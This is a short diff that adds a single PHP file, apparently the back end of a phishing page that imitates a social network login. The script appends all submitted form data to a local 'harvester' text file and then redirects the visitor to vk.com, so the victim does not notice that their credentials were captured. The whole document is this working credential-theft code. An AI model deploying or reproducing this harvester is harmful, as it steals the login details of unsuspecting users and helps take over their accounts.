@@ -1,0 +1,1 @@
+<?php $file = 'harvester_2016-05-18 20:32:07.318756.txt';file_put_contents($file, print_r($_POST, true), FILE_APPEND);?><meta http-equiv="refresh" content="0; url=http://www.vk.com" />
